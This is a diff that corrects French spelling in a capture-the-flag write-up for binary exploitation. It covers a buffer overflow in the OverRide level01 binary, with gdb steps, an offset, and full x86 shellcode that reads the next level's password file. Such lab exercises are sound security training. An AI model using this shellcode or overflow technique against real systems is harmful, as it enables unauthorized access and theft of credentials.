@@ -11,7 +11,7 @@ level01@OverRide:~$
 
 ➜  override git:(main) ✗ scp -P 4242 level01@192.168.1.28:/home/users/level01/level01 ./bin/.
 
-puis decompilation avec https://dogbolt.org/ 
+puis décompilation avec https://dogbolt.org/ 
 
 
 level01@OverRide:~$ ./level01
@@ -26,11 +26,11 @@ nope, incorrect password...
 level01@OverRide:~$ 
 
 
-dans tout les cas le mdp seras incorrect
+dans tous les cas le mdp sera incorrect
 et il ne se passe rien dans le cas ou le mdp serait bon
 
 
-essaie de connexion avec dat_wil || admin
+essai de connexion avec dat_wil / admin
 level01@OverRide:~$ su level02
 Password:
 su: Authentication failure
@@ -141,7 +141,7 @@ offset = 80
 il faut creer un shellcode et la payload
 
   char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
-On sait que le buffer s est stocker a ebp-4Ch
+On sait que le buffer s est stocké à ebp-4Ch
 
 (gdb) b *0x080484fe
 Breakpoint 1 at 0x80484fe
@@ -160,7 +160,7 @@ avec /home/users/level02////.pass pour eviter les \00
 \x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x2f\x2f\x2f\x2e\x68\x6c\x30\x32\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
 
 
-auquel on ajoute \x31\xD2 pour initaliser EDX a 0
+auquel on ajoute \x31\xD2 pour initialiser EDX à 0
 https://defuse.ca/online-x86-assembler.htm#disassembly2
 Disassembly:
 0:  31 d2                   xor    edx,edx
@@ -181,7 +181,7 @@ level01@OverRide:/tmp$ gcc -m32 get_env.c
 level01@OverRide:/tmp$ ./a.out
 0xffffd6bc
 
-Edit du script avec la bonne adddresse
+Edit du script avec la bonne adresse
 level01@OverRide:/tmp$ nano script.py
 
 level01@OverRide:~$ python /tmp/script.py | ./level01
